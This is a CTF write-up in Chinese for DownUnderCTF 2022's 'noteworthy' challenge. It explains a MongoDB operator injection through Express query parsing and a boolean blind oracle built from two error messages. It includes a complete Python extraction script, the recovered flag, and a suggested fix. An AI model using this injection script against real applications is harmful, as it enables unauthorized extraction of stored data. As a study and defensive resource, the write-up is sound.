# DownUnderCTF 2022 noteworthy Writeup

## 题目简述

这是一个 Express、Mongoose 和 MongoDB 实现的笔记网站。管理员的 `noteId=1337` 笔记内容是 flag。普通用户不能读取该笔记，但编辑接口把完整查询参数对象直接传给 `Note.findOne`，从而允许注入 MongoDB 比较运算符并构造布尔盲注 oracle。

## 解题过程

漏洞代码为：

```javascript
let q = req.query
const note = await Note.findOne(q)

if (!note) {
    return res.render('error', { message: 'Note does not exist!' })
}
if (note.owner.toString() != req.user.userId.toString()) {
    return res.render('error', { message: 'You are not the owner of this note!' })
}
```

Express 会把 `contents[$gt]=X` 解析成嵌套对象，Mongoose 最终执行近似如下查询：

```javascript
{ noteId: 1337, contents: { $gt: "X" } }
```

若 flag 按 MongoDB 字符串顺序大于 `X`，查询会找到管理员笔记，页面返回“不是所有者”；否则返回“笔记不存在”。两个稳定响应构成一位布尔 oracle。

注册普通账号取得会话后，可按可打印字符的排序逐位恢复。对已知前缀 `prefix`，`flag > prefix + c` 在 `c` 小于或等于真实下一字符时通常为真，到下一个字符时变为假；终止字符 `}` 与完整 flag 相等，需要单独处理：

```python
import string
import requests

base = 'http://target'
s = requests.Session()
s.post(base + '/register', json={
    'username': 'solver-user',
    'password': 'solver-password',
})

def oracle(candidate):
    r = s.get(base + '/edit', params={
        'noteId': '1337',
        'contents[$gt]': candidate,
    })
    return 'You are not the owner of this note!' in r.text

alphabet = sorted(set(string.printable) - set('\t\n\r\x0b\x0c'))
flag = ''
while not flag.endswith('}'):
    for left, right in zip(alphabet, alphabet[1:]):
        if oracle(flag + left) and not oracle(flag + right):
            flag += right if right == '}' else left
            print(flag)
            break
    else:
        raise RuntimeError('oracle 与字符集不匹配')
```

恢复结果为：

```text
DUCTF{n0sql1_1s_th3_new_5qli}
```

## 方法总结

问题不只是“允许传 `$gt`”，还在于接口把查询结果是否存在通过两种错误页面泄露出来。所有权检查发生在 `findOne` 之后，因此即使不能读取管理员笔记，也能观察条件是否匹配。修复时应只从请求中提取并强制转换允许的标量字段，例如把 `noteId` 转成整数，而不是把 `req.query` 原样作为数据库过滤器。
